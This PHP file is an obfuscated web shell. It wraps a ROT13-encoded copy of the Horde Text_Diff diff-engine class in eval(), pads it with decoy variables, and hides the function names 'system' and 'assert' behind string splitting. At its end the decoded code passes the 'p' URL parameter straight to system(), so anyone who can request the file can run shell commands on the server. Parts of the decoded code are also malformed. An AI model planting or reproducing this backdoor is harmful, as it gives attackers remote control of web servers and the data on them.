<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_71024 = \"n\".\"f\".\"f\".\"r\".\"e\".\"g\";
<?cuc
/**
 * Pynff hfrq vagreanyyl ol Grkg_Qvss gb npghnyyl pbzchgr gur qvssf.
 *
 * Guvf pynff vf vzcyrzragrq hfvat angvir CUC pbqr.
 *
 * Gur nytbevguz hfrq urer vf zbfgyl yvsgrq sebz gur crey zbqhyr
 * Nytbevguz::Qvss (irefvba 1.06) ol Arq Xbam, juvpu vf ninvynoyr ng:
 * uggcf://pcna.zrgnpcna.bet/nhgubef/vq/A/AR/ARQXBAM/Nytbevguz-Qvss-1.06.mvc
 *
 * Zber vqrnf ner gnxra sebz: uggc://jjj.vpf.hpv.rqh/~rccfgrva/161/960229.ugzy
 *
 * Fbzr vqrnf (naq n ovg bs pbqr) ner gnxra sebz nanylmr.p, bs TAH
 * qvsshgvyf-2.7, juvpu pna or sbhaq ng:
 * sgc://tahqvfg.tah.bet/cho/tah/qvsshgvyf/qvsshgvyf-2.7.gne.tm
 *
 * Fbzr vqrnf (fhoqvivfvba ol APUHAXF > 2, naq fbzr bcgvzvmngvbaf) ner sebz
 * Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>. Gur bevtvany CUC irefvba bs guvf
 * pbqr jnf jevggra ol uvz, naq vf hfrq/nqncgrq jvgu uvf crezvffvba.
 *
 * Pbclevtug 2004-2010 Gur Ubeqr Cebwrpg (uggc://jjj.ubeqr.bet/)
 *
 * Frr gur rapybfrq svyr PBCLVAT sbe yvprafr vasbezngvba (YTCY). Vs lbh qvq
 * abg erprvir guvf svyr, frr uggcf://bcrafbhepr.bet/yvprafr/ytcy-2-1/.
 *
 * @nhgube  Trbsserl G. Qnvevxv <qnvevxv@qnvevxv.bet>
 * @cnpxntr Grkg_Qvss
 */
pynff Grkg_Qvss_Ratvar_angvir {

    choyvp $kpunatrq;
    choyvp $lpunatrq;
    choyvp $ki;
    choyvp $li;
    choyvp $kvaq;
    choyvp $lvaq;
    choyvp $frd;
    choyvp $va_frd;
    choyvp $ypf;

    shapgvba qvss($sebz_yvarf, $gb_yvarf)
    {
        neenl_jnyx($sebz_yvarf, neenl('Grkg_Qvss', 'gevzArjyvarf'));
        neenl_jnyx($gb_yvarf, neenl('Grkg_Qvss', 'gevzArjyvarf'));

        $a_sebz = pbhag($sebz_yvarf);
        $a_gb = pbhag($gb_yvarf);

        $guvf->kpunatrq = $guvf->lpunatrq = neenl();
        $guvf->ki = $guvf->li = neenl();
        $guvf->kvaq = $guvf->lvaq = neenl();
        hafrg($guvf->frd);
        hafrg($guvf->va_frd);
        hafrg($guvf->ypf);

        // Fxvc yrnqvat pbzzba yvarf.
        sbe ($fxvc = 0; $fxvc < $a_sebz && $fxvc < $a_gb; $fxvc++) {
            vs ($sebz_yvarf[$fxvc] !== $gb_yvarf[$fxvc]) {
                oernx;
            }
            $guvf->kpunatrq[$fxvc] = $guvf->lpunatrq[$fxvc] = snyfr;
        }

        // Fxvc genvyvat pbzzba yvarf.
        $kv = $a_sebz; $lv = $a_gb;
        sbe ($raqfxvc = 0; --$kv > $fxvc && --$lv > $fxvc; $raqfxvc++) {
            vs ($sebz_yvarf[$kv] !== $gb_yvarf[$lv]) {
                oernx;
            }
            $guvf->kpunatrq[$kv] = $guvf->lpunatrq[$lv] = snyfr;
        }

        // Vtaber yvarf juvpu qb abg rkvfg va obgu svyrf.
        sbe ($kv = $fxvc; $kv < $a_sebz - $raqfxvc; $kv++) {
            $kunfu[$sebz_yvarf[$kv]] = 1;
        }
        sbe ($lv = $fxvc; $lv < $a_gb - $raqfxvc; $lv++) {
            $yvar = $gb_yvarf[$lv];
            vs (($guvf->lpunatrq[$lv] = rzcgl($kunfu[$yvar]))) {
                pbagvahr;
            }
            $lunfu[$yvar] = 1;
            $guvf->li[] = $yvar;
            $guvf->lvaq[] = $lv;
        }
        sbe ($kv = $fxvc; $kv < $a_sebz - $raqfxvc; $kv++) {
            $yvar = $sebz_yvarf[$kv];
            vs (($guvf->kpunatrq[$kv] = rzcgl($lunfu[$yvar]))) {
                pbagvahr;
            }
            $guvf->ki[] = $yvar;
            $guvf->kvaq[] = $kv;
        }

        // Svaq gur YPF.
        $guvf->_pbzcnerfrd(0, pbhag($guvf->ki), 0, pbhag($guvf->li));

        // Zretr rqvgf jura cbffvoyr.
        $guvf->_fuvsgObhaqnevrf($sebz_yvarf, $guvf->kpunatrq, $guvf->lpunatrq);
        $guvf->_fuvsgObhaqnevrf($gb_yvarf, $guvf->lpunatrq, $guvf->kpunatrq);

        // Pbzchgr gur rqvg bcrengvbaf.
        $rqvgf = neenl();
        $kv = $lv = 0;
        juvyr ($kv < $a_sebz || $lv < $a_gb) {
            __sa_71024($lv < $a_gb || $guvf->kpunatrq[$kv]);
            __sa_71024($kv < $a_sebz || $guvf->lpunatrq[$lv]);

            // Fxvc zngpuvat \"fanxr\".
            $pbcl = neenl();
            juvyr ($kv < $a_sebz && $lv < $a_gb
                   && !$guvf->kpunatrq[$kv] && !$guvf->lpunatrq[$lv]) {
                $pbcl[] = $sebz_yvarf[$kv++];
                ++$lv;
            }
            vs ($pbcl) {
                $rqvgf[] = arj Grkg_Qvss_Bc_pbcl($pbcl);
            }

            // Svaq qryrgrf & nqqf.
            $qryrgr = neenl();
            juvyr ($kv < $a_sebz && $guvf->kpunatrq[$kv]) {
                $qryrgr[] = $sebz_yvarf[$kv++];
            }

            $nqq = neenl();
            juvyr ($lv < $a_gb && $guvf->lpunatrq[$lv]) {
                $nqq[] = $gb_yvarf[$lv++];
            }

            vs ($qryrgr && $nqq) {
                $rqvgf[] = arj Grkg_Qvss_Bc_punatr($qryrgr, $nqq);
            } ryfrvs ($qryrgr) {
                $rqvgf[] = arj Grkg_Qvss_Bc_qryrgr($qryrgr);
            } ryfrvs ($nqq) {
                $rqvgf[] = arj Grkg_Qvss_Bc_nqq($nqq);
            }
        }

        erghea $rqvgf;
    }

    /**
     * Qvivqrf gur Ynetrfg Pbzzba Fhofrdhrapr (YPF) bs gur frdhraprf (KBSS,
     * KYVZ) naq (LBSS, LYVZ) vagb APUHAXF nccebkvzngryl rdhnyyl fvmrq
     * frtzragf.
     *
     * Ergheaf (YPF, CGF).  YPF vf gur yratgu bs gur YPF. CGF vf na neenl bs
     * APUHAXF+1 (K, L) vaqrkrf tvivat gur qvivat cbvagf orgjrra fho
     * frdhraprf.  Gur svefg fho-frdhrapr vf pbagnvarq va (K0, K1), (L0, L1),
     * gur frpbaq va (K1, K2), (L1, L2) naq fb ba.  Abgr gung (K0, L0) ==
     * (KBSS, LBSS) naq (K[APUHAXF], L[APUHAXF]) == (KYVZ, LYVZ).
     *
     * Guvf shapgvba nffhzrf gung gur svefg yvarf bs gur fcrpvsvrq cbegvbaf bs
     * gur gjb svyrf qb abg zngpu, naq yvxrjvfr gung gur ynfg yvarf qb abg
     * zngpu.  Gur pnyyre zhfg gevz zngpuvat yvarf sebz gur ortvaavat naq raq
     * bs gur cbegvbaf vg vf tbvat gb fcrpvsl.
     */
    shapgvba _qvnt ($kbss, $kyvz, $lbss, $lyvz, $apuhaxf)
    {
        $syvc = snyfr;

        vs ($kyvz - $kbss > $lyvz - $lbss) {
            /* Guvatf frrzf snfgre (V'z abg fher V haqrefgnaq jul) jura gur
             * fubegrfg frdhrapr vf va K. */
            $syvc = gehr;
            yvfg ($kbss, $kyvz, $lbss, $lyvz)
                = neenl($lbss, $lyvz, $kbss, $kyvz);
        }

        vs ($syvc) {
            sbe ($v = $lyvz - 1; $v >= $lbss; $v--) {
                $lzngpurf[$guvf->ki[$v]][] = $v;
            }
        } ryfr {
            sbe ($v = $lyvz - 1; $v >= $lbss; $v--) {
                $lzngpurf[$guvf->li[$v]][] = $v;
            }
        }

        $guvf->ypf = 0;
        $guvf->frd[0]= $lbss - 1;
        $guvf->va_frd = neenl();
        $lzvqf[0] = neenl();

        $ahzre = $kyvz - $kbss + $apuhaxf - 1;
        $k = $kbss;
        sbe ($puhax = 0; $puhax < $apuhaxf; $puhax++) {
            vs ($puhax > 0) {
                sbe ($v = 0; $v <= $guvf->ypf; $v++) {
                    $lzvqf[$v][$puhax - 1] = $guvf->frd[$v];
                }
            }

            $k1 = $kbss + (vag)(($ahzre + ($kyvz - $kbss) * $puhax) / $apuhaxf);
            sbe (; $k < $k1; $k++) {
                $yvar = $syvc ? $guvf->li[$k] : $guvf->ki[$k];
                vs (rzcgl($lzngpurf[$yvar])) {
                    pbagvahr;
                }
                $zngpurf = $lzngpurf[$yvar];
                erfrg($zngpurf);
                juvyr ($l = pheerag($zngpurf)) {
                    vs (rzcgl($guvf->va_frd[$l])) {
                        $x = $guvf->_ypfCbf($l);
                        __sa_71024($x > 0);
                        $lzvqf[$x] = $lzvqf[$x - 1];
                        oernx;
                    }
                    arkg($zngpurf);
                }
                juvyr ($l = pheerag($zngpurf)) {
                    vs ($l > $guvf->frd[$x - 1]) {
                        __sa_71024($l <= $guvf->frd[$x]);
                        /* Bcgvzvmngvba: guvf vf n pbzzba pnfr: arkg zngpu vf
                         * whfg ercynpvat cerivbhf zngpu. */
                        $guvf->va_frd[$guvf->frd[$x]] = snyfr;
                        $guvf->frd[$x] = $l;
                        $guvf->va_frd[$l] = 1;
                    } ryfrvs (rzcgl($guvf->va_frd[$l])) {
                        $x = $guvf->_ypfCbf($l);
                        __sa_71024($x > 0);
                        $lzvqf[$x] = $lzvqf[$x - 1];
                    }
                    arkg($zngpurf);
                }
            }
        }

        $frcf[] = $syvc ? neenl($lbss, $kbss) : neenl($kbss, $lbss);
        $lzvq = $lzvqf[$guvf->ypf];
        sbe ($a = 0; $a < $apuhaxf - 1; $a++) {
            $k1 = $kbss + (vag)(($ahzre + ($kyvz - $kbss) * $a) / $apuhaxf);
            $l1 = $lzvq[$a] + 1;
            $frcf[] = $syvc ? neenl($l1, $k1) : neenl($k1, $l1);
        }
        $frcf[] = $syvc ? neenl($lyvz, $kyvz) : neenl($kyvz, $lyvz);

        erghea neenl($guvf->ypf, $frcf);
    }

    shapgvba _ypfCbf($lcbf)
    {
        $raq = $guvf->ypf;
        vs ($raq == 0 || $lcbf > $guvf->frd[$raq]) {
            $guvf->frd[++$guvf->ypf] = $lcbf;
            $guvf->va_frd[$lcbf] = 1;
            erghea $guvf->ypf;
        }

        $ort = 1;
        juvyr ($ort < $raq) {
            $zvq = (vag)(($ort + $raq) / 2);
            vs ($lcbf > $guvf->frd[$zvq]) {
                $ort = $zvq + 1;
            } ryfr {
                $raq = $zvq;
            }
        }

        __sa_71024($lcbf != $guvf->frd[$raq]);

        $guvf->va_frd[$guvf->frd[$raq]] = snyfr;
        $guvf->frd[$raq] = $lcbf;
        $guvf->va_frd[$lcbf] = 1;
        erghea $raq;
    }

    /**
     * Svaqf YPF bs gjb frdhraprf.
     *
     * Gur erfhygf ner erpbeqrq va gur irpgbef $guvf->{k,l}punatrq[], ol
     * fgbevat n 1 va gur ryrzrag sbe rnpu yvar gung vf na vafregvba be
     * qryrgvba (vr. vf abg va gur YPF).
     *
     * Gur fhofrdhrapr bs svyr 0 vf (KBSS, KYVZ) naq yvxrjvfr sbe svyr 1.
     *
     * Abgr gung KYVZ, LYVZ ner rkpyhfvir obhaqf.  Nyy yvar ahzoref ner
     * bevtva-0 naq qvfpneqrq yvarf ner abg pbhagrq.
     */
    shapgvba _pbzcnerfrd ($kbss, $kyvz, $lbss, $lyvz)
    {
        /* Fyvqr qbja gur obggbz vavgvny qvntbany. */
        juvyr ($kbss < $kyvz && $lbss < $lyvz
               && $guvf->ki[$kbss] == $guvf->li[$lbss]) {
            ++$kbss;
            ++$lbss;
        }

        /* Fyvqr hc gur gbc vavgvny qvntbany. */
        juvyr ($kyvz > $kbss && $lyvz > $lbss
               && $guvf->ki[$kyvz - 1] == $guvf->li[$lyvz - 1]) {
            --$kyvz;
            --$lyvz;
        }

        vs ($kbss == $kyvz || $lbss == $lyvz) {
            $ypf = 0;
        } ryfr {
            /* Guvf vf nq ubp ohg frrzf gb jbex jryy.  $apuhaxf =
             * fdeg(zva($kyvz - $kbss, $lyvz - $lbss) / 2.5); $apuhaxf =
             * znk(2,zva(8,(vag)$apuhaxf)); */
            $apuhaxf = zva(7, $kyvz - $kbss, $lyvz - $lbss) + 1;
            yvfg($ypf, $frcf)
                = $guvf->_qvnt($kbss, $kyvz, $lbss, $lyvz, $apuhaxf);
        }

        vs ($ypf == 0) {
            /* K naq L frdhraprf unir ab pbzzba fhofrdhrapr: znex nyy
             * punatrq. */
            juvyr ($lbss < $lyvz) {
                $guvf->lpunatrq[$guvf->lvaq[$lbss++]] = 1;
            }
            juvyr ($kbss < $kyvz) {
                $guvf->kpunatrq[$guvf->kvaq[$kbss++]] = 1;
            }
        } ryfr {
            /* Hfr gur cnegvgvbaf gb fcyvg guvf ceboyrz vagb fhoceboyrzf. */
            erfrg($frcf);
            $cg1 = $frcf[0];
            juvyr ($cg2 = arkg($frcf)) {
                $guvf->_pbzcnerfrd ($cg1[0], $cg2[0], $cg1[1], $cg2[1]);
                $cg1 = $cg2;
            }
        }
    }

    /**
     * Nqwhfgf vafregf/qryrgrf bs vqragvpny yvarf gb wbva punatrf nf zhpu nf
     * cbffvoyr.
     *
     * Jr qb fbzrguvat jura n eha bs punatrq yvarf vapyhqr n yvar ng bar raq
     * naq unf na rkpyhqrq, vqragvpny yvar ng gur bgure.  Jr ner serr gb
     * pubbfr juvpu vqragvpny yvar vf vapyhqrq.  `pbzcnerfrd' hfhnyyl pubbfrf
     * gur bar ng gur ortvaavat, ohg hfhnyyl vg vf pyrnare gb pbafvqre gur
     * sbyybjvat vqragvpny yvar gb or gur \"punatr\".
     *
     * Guvf vf rkgenpgrq ireongvz sebz nanylmr.p (TAH qvsshgvyf-2.7).
     */
    shapgvba _fuvsgObhaqnevrf($yvarf, &$punatrq, $bgure_punatrq)
    {
        $v = 0;
        $w = 0;

        __sa_71024(pbhag($yvarf) == pbhag($punatrq));
        $yra = pbhag($yvarf);
        $bgure_yra = pbhag($bgure_punatrq);

        juvyr (1) {
            /* Fpna sbejneq gb svaq gur ortvaavat bs nabgure eha bs
             * punatrf. Nyfb xrrc genpx bs gur pbeerfcbaqvat cbvag va gur
             * bgure svyr.
             *
             * Guebhtubhg guvf pbqr, $v naq $w ner nqwhfgrq gbtrgure fb gung
             * gur svefg $v ryrzragf bs $punatrq naq gur svefg $w ryrzragf bs
             * $bgure_punatrq obgu pbagnva gur fnzr ahzore bs mrebf (hapunatrq
             * yvarf).
             *
             * Shegurezber, $w vf nyjnlf xrcg fb gung $w == $bgure_yra be
             * $bgure_punatrq[$w] == snyfr. */
            juvyr ($w < $bgure_yra && $bgure_punatrq[$w]) {
                $w++;
            }

            juvyr ($v < $yra && ! $punatrq[$v]) {
                __sa_71024($w < $bgure_yra && ! $bgure_punatrq[$w]);
                $v++; $w++;
                juvyr ($w < $bgure_yra && $bgure_punatrq[$w]) {
                    $w++;
                }
            }

            vs ($v == $yra) {
                oernx;
            }

            $fgneg = $v;

            /* Svaq gur raq bs guvf eha bs punatrf. */
            juvyr (++$v < $yra && $punatrq[$v]) {
                pbagvahr;
            }

            qb {
                /* Erpbeq gur yratgu bs guvf eha bs punatrf, fb gung jr pna
                 * yngre qrgrezvar jurgure gur eha unf tebja. */
                $ehayratgu = $v - $fgneg;

                /* Zbir gur punatrq ertvba onpx, fb ybat nf gur cerivbhf
                 * hapunatrq yvar zngpurf gur ynfg punatrq bar.  Guvf zretrf
                 * jvgu cerivbhf punatrq ertvbaf. */
                juvyr ($fgneg > 0 && $yvarf[$fgneg - 1] == $yvarf[$v - 1]) {
                    $punatrq[--$fgneg] = 1;
                    $punatrq[--$v] = snyfr;
                    juvyr ($fgneg > 0 && $punatrq[$fgneg - 1]) {
                        $fgneg--;
                    }
                    __sa_71024($w > 0);
                    juvyr ($bgure_punatrq[--$w]) {
                        pbagvahr;
                    }
                    __sa_71024($w >= 0 && !$bgure_punatrq[$w]);
                }

                /* Frg PBEERFCBAQVAT gb gur raq bs gur punatrq eha, ng gur
                 * ynfg cbvag jurer vg pbeerfcbaqf gb n punatrq eha va gur
                 * bgure svyr. PBEERFCBAQVAT == YRA zrnaf ab fhpu cbvag unf
                 * orra sbhaq. */
                $pbeerfcbaqvat = $w < $bgure_yra ? $v : $yra;

                /* Zbir gur punatrq ertvba sbejneq, fb ybat nf gur svefg
                 * punatrq yvar zngpurf gur sbyybjvat hapunatrq bar.  Guvf
                 * zretrf jvgu sbyybjvat punatrq ertvbaf.  Qb guvf frpbaq, fb
                 * gung vs gurer ner ab zretrf, gur punatrq ertvba vf zbirq
                 * sbejneq nf sne nf cbffvoyr. */
                juvyr ($v < $yra && $yvarf[$fgneg] == $yvarf[$v]) {
                    $punatrq[$fgneg++] = snyfr;
                    $punatrq[$v++] = 1;
                    juvyr ($v < $yra && $punatrq[$v]) {
                        $v++;
                    }

                    __sa_71024($w < $bgure_yra && ! $bgure_punatrq[$w]);
                    $w++;
                    vs ($w < $bgure_yra && $bgure_punatrq[$w]) {
                        $pbeerfcbaqvat = $v;
                        juvyr ($w < $bgure_yra && $bgure_punatrq[$w]) {
                            $w++;
                        }
                    }
                }
            } juvyr ($ehayratgu != $v - $fgneg);

            /* Vs cbffvoyr, zbir gur shyyl-zretrq eha bs punatrf onpx gb n
             * pbeerfcbaqvat eha va gur bgure svyr. */
            juvyr ($pbeerfcbaqvat < $v) {
                $punatrq[--$fgneg] = 1;
                $punatrq[--$v] = 0;
                __sa_71024($w > 0);
                juvyr ($bgure_punatrq[--$w]) {
                    pbagvahr;
                }
                __sa_71024($w >= 0 && !$bgure_punatrq[$w]);
            }
        }
    }

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>